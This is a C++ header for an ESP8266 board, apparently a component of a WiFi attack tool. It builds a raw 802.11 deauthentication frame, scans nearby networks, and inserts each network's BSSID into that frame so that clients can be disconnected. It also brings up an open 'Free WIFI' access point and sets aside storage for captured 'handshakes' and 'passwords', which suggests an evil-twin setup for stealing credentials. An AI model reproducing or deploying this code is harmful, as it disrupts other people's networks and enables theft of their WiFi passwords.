#pragma once

#include <ArduinoJson.h>
#include <ESP8266WiFi.h>
#include "utils.h"

class AccessPoint
{
public:
  String ssid;
  String bssid;
  int channel;
  String encryptionType;
  signed signalStrength;
  int deauthState = 0;
  // deauth pkt from spacehuhn
  uint8_t deauthPacket[26] = {
      /*  0 - 1  */ 0xC0, 0x00,                         // type, subtype c0: deauth (a0: disassociate)
      /*  2 - 3  */ 0x00, 0x00,                         // duration (SDK takes care of that)
      /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // reciever (target)
      /* 10 - 15 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // source (ap)
      /* 16 - 21 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // BSSID (ap)
      /* 22 - 23 */ 0x00, 0x00,                         // fragment & squence number
      /* 24 - 25 */ 0x01, 0x00                          // reason code (1 = unspecified reason)
  };
};

extern bool setupWifi();
extern bool changeWifi(String ssid);
extern void initialServerSetup(IPAddress APIP);
extern int scan_networks(AccessPoint ap[]);
extern void list_network_details(AccessPoint ap[], int len);

void initialServerSetup(IPAddress APIP)
{
  WiFi.mode(WIFI_AP_STA);
  WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
  if (setupWifi())
  {
    Serial.println("Wifi setup successful");
  }
  else
  {
    Serial.println("Wifi setup failed");
  }
}

bool setupWifi()
{
  if (!LittleFS.exists("/json/datas.json"))
  {
    DynamicJsonDocument datas(1024);
    datas.createNestedArray("handshakes");
    datas.createNestedArray("passwords");
    writeJsonFile("/json/datas.json", datas);
  }
  if (!LittleFS.exists("/json/config.json"))
  {
    DynamicJsonDocument config(1024);
    config["ssid"] = "Free WIFI";
    writeJsonFile("/json/config.json", config);
    WiFi.softAP("Free WIFI");
    return true;
  }
  else
  {
    DynamicJsonDocument config = readJsonFile("/json/config.json");
    const char *ssid = config["ssid"];
    Serial.println("SSID: " + String(ssid));
    WiFi.softAP(ssid);
    return true;
  }
}

bool changeWifi(String ssid)
{
  DynamicJsonDocument config = readJsonFile("/json/config.json");
  config["ssid"] = ssid;
  writeJsonFile("/json/config.json", config);
  setupWifi();
  return true;
}

void list_network_details(AccessPoint ap[], int len)
{
  for (int i = 0; i < len; i++)
  {
    Serial.print("AP no: ");
    Serial.println(i + 1);
    Serial.println("SSID: " + ap[i].ssid);
    Serial.println("BSSID: " + ap[i].bssid);
    Serial.print("Channel: ");
    Serial.println(ap[i].channel);
    Serial.print("Encryption: ");
    Serial.println(ap[i].encryptionType);
    Serial.print("Signal Strength: ");
    Serial.println(ap[i].signalStrength);
    Serial.println("--------------------");
  }
}

int scan_networks(AccessPoint ap[])
{
  int numNetworks = WiFi.scanNetworks();
  Serial.println("Scan complete");
  if (numNetworks == 0)
  {
    Serial.println("No networks found");
  }
  else
  {
    Serial.println(String(numNetworks) + " network found, updating ap list");
    for (int i = 0; i < numNetworks; i++)
    {
      ap[i].ssid = WiFi.SSID(i);
      ap[i].bssid = WiFi.BSSIDstr(i);
      ap[i].channel = WiFi.channel(i);
      ap[i].encryptionType = encryption_str(WiFi.encryptionType(i));
      ap[i].signalStrength = WiFi.RSSI(i);

      // set the BSSID of the deauth packet
      uint8_t mac[6];
      const char *myCharPtr = ap[i].bssid.c_str();
      for (int i = 0; i < 6; i++)
      {
        char byte_str[3];
        byte_str[0] = myCharPtr[i * 3];
        byte_str[1] = myCharPtr[i * 3 + 1];
        byte_str[2] = '\0';
        mac[i] = strtol(byte_str, NULL, 16);
      }
      memcpy(ap[i].deauthPacket + 10, mac, 6);
      memcpy(ap[i].deauthPacket + 16, mac, 6);
    }
  }
  return numNetworks;
}
